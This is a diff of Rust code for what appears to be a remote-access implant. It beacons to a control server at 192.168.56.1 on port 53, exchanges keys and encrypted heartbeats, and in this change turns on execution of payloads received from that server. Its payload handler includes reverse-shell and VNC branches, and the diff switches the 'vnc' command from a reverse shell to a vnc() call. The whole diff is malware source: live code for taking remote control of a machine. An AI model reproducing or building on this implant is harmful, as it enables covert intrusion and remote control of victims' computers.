@@ -63,8 +63,8 @@ pub fn interpret_payload(payload: String) {
         
     }
     else if infos_payload[0] == "vnc"{
-        println!("Activating reverseshell");
-        shell(infos_payload[1], infos_payload[2]);
+        println!("Activating vnc");
+        vnc();
     }
 }
 
@@ -155,7 +155,7 @@ async fn main() -> io::Result<()> {
     let username = env::var(key).unwrap();
 
     // TCP Stream creation
-    let mut _stream = TcpStream::connect("192.168.43.141:53").await?;
+    let mut _stream = TcpStream::connect("192.168.56.1:53").await?;
     let (mut reader, mut writer) = _stream.into_split();
 
     // Send public key
@@ -216,9 +216,9 @@ async fn main() -> io::Result<()> {
                 println!("Heartbeat recieved");
                 let pingback = String::from_utf8(dec_data).expect("Found invalid UTF-8");
                 let from_json_message: Message = serde_json::from_str(&pingback).unwrap();
-                //if from_json_message.message_type == "payload" {
-                //    interpret_payload(from_json_message.message_content);
-                //}
+                if from_json_message.message_type == "payload" {
+                    interpret_payload(from_json_message.message_content);
+                }
                 println!("{}", from_json_message.message_content);
             }
             Err(e) => {println!("Fuck you ! {}", e);}
